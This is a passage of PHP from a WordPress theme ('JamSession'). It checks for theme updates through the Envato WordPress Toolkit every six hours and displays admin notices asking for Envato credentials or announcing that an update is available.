    }
    
    /* check updates only after a while */
    $lastCheck = get_option( 'toolkit-last-toolkit-check' );
    if ( $lastCheck === false ) 
	{
        update_option( 'toolkit-last-toolkit-check', time() );
        return;
    }
    
    /* check for an update every 6 hours */
    if ( (time() - $lastCheck) < 21600 ) 
	{
        return;
    }
    
    /* update the time we last checked */
    update_option( 'toolkit-last-toolkit-check', time() );
    
    /* check for updates */
    $upgrader = new Envato_WordPress_Theme_Upgrader( $credentials['user_name'], $credentials['api_key'] );
    $updates = $upgrader->check_for_theme_update();

    /* add update alert, to update the theme */
    if ( true == $updates->updated_themes_count ) 
	{
        add_action( 'admin_notices', 'JAMSESSION_SWP_envato_toolkit_admin_notices' );
    }

    /*
     *  Uncomment to update the current theme
     */
    
    // $upgrader->upgrade_theme();
 
}
add_action( 'admin_init', 'JAMSESSION_SWP_envato_toolkit_admin_init' );


/**
 * Display a notice in the admin to remind the user to enter their credentials
 */
function JAMSESSION_SWP_envato_toolkit_credentials_admin_notices() 
{
    $message = sprintf( __( "To enable theme update notifications, please enter your Envato Marketplace credentials in the %s", "default" ),
                        "<a href='" . admin_url() . "admin.php?page=envato-wordpress-toolkit'>Envato WordPress Toolkit Plugin</a>" );
						
    echo "<div id='message' class='updated below-h2'><p>{$message}</p></div>";
}

/**
 * Display a notice in the admin that an update is available
 */
function JAMSESSION_SWP_envato_toolkit_admin_notices() 
{
    $message = sprintf( __( "An update to the theme is available! Head over to %s to update it now.", "default" ),
                        "<a href='" . admin_url() . "admin.php?page=envato-wordpress-toolkit'>Envato WordPress Toolkit Plugin</a>" );

    echo "<div id='message' class='updated below-h2'><p>{$message}</p></div>";
}



?>